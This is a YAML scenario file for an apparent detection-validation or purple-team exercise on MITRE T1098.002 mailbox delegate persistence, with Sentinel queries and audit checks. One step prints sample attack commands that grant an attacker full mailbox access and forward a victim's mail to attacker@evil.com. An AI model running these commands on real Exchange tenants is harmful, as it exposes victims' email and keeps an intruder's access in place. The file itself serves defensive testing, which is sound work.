id: T1098.002_account_manipulation_email_delegate
name: "Account Manipulation — Additional Email Delegate Permissions"
mitre_technique: "T1098.002"
mitre_tactic: "persistence"
description: >
  Adversaries grant additional mailbox delegate permissions to maintain persistent
  access to a victim's email. Methods include: adding full mailbox access via
  Add-MailboxPermission (allows reading/sending as the victim), adding folder-level
  permissions to Inbox, or adding a forwarding rule. With mailbox access, adversaries
  can monitor communications, intercept credentials, and maintain situational awareness
  even after losing other access. Exchange Online audit logging must be enabled to
  detect these changes.
author: stanleytobias
created: "2026-01-01"
platform: windows
references:
  - https://attack.mitre.org/techniques/T1098/002/

steps:
  - step: 1
    type: marker
    description: "Technique context"
    message: "T1098.002 — Email Delegate: adversary grants themselves mailbox access or sets forwarding to maintain email visibility"

  - step: 2
    type: exec_powershell
    description: "Check Exchange Online audit logging and delegate permission visibility"
    command: |
      Write-Host "[PAS] Exchange Online delegate permission persistence check:"
      Write-Host "[PAS] Real attack vectors:"
      Write-Host "  Add-MailboxPermission -Identity victim -User attacker -AccessRights FullAccess"
      Write-Host "  Set-Mailbox -Identity victim -ForwardingAddress attacker@evil.com -DeliverToMailboxAndForward `$true"
      Write-Host "  Add-MailboxFolderPermission -Identity victim:\Inbox -User attacker -AccessRights Owner"
      Write-Host ""
      Write-Host "[PAS] Checking for Exchange PowerShell module:"
      $exo = Get-Module ExchangeOnlineManagement -ListAvailable -ErrorAction SilentlyContinue
      Write-Host "  ExchangeOnlineManagement module: $($null -ne $exo)"

  - step: 3
    type: marker
    description: "Forwarding rule audit"
    message: "CONTROL CHECK: Run monthly — Get-Mailbox | Where-Object {$_.ForwardingAddress -or $_.ForwardingSmtpAddress} | Select-Object Name,ForwardingAddress. Any external forwarding is a high-priority finding."

  - step: 4
    type: marker
    description: "Delegate access audit"
    message: "CONTROL CHECK: Audit full-access mailbox delegates: Get-MailboxPermission | Where-Object {$_.AccessRights -contains 'FullAccess' -and -not $_.IsInherited}. Review quarterly and alert on additions."

  - step: 5
    type: sleep
    description: "Allow telemetry to flush"
    seconds: 3

  - step: 6
    type: marker
    description: "Post-execution prompt"
    message: "Check Sentinel — OfficeActivity | where Operation in ('Add-MailboxPermission','Set-Mailbox') | where Parameters contains 'ForwardingAddress'"

cleanup:
  - step: 1
    type: marker
    description: "No persistent artifacts"
    message: "T1098.002 cleanup complete — marker-only scenario"

analyst_checklist:
  - "Sentinel: OfficeActivity | where Operation == 'Add-MailboxPermission' and Parameters contains 'FullAccess'"
  - "Sentinel: OfficeActivity | where Operation == 'Set-Mailbox' and Parameters contains 'ForwardingAddress'"
  - "Sentinel: OfficeActivity | where Operation == 'New-InboxRule' and Parameters contains 'ForwardTo'"
  - "MDE alert: 'Suspicious mailbox delegation' or 'Email forwarding to external address'"
  - "CONTROL CHECK: Disable automatic external email forwarding at the tenant level unless business-justified"
  - "CONTROL CHECK: Unified Audit Log must be enabled — Exchange Online actions are only visible with UAL on"
  - "CONTROL CHECK: Microsoft Secure Score — 'Do not allow mailbox delegation' recommendation"
